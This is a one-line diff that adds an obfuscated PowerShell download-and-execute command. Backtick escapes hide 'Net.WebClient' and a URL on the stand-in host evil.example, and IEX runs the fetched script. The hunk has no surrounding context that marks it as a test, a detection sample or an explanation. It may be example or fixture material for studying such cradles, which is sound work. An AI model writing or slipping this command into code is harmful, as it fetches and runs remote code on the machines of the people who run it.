@@ -1,0 +1,1 @@
+IEX (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T").DownloadString("`h`t`t`p`:`/`/`e`v`i`l`.`e`x`a`m`p`l`e`/`x`.`p`s`1")
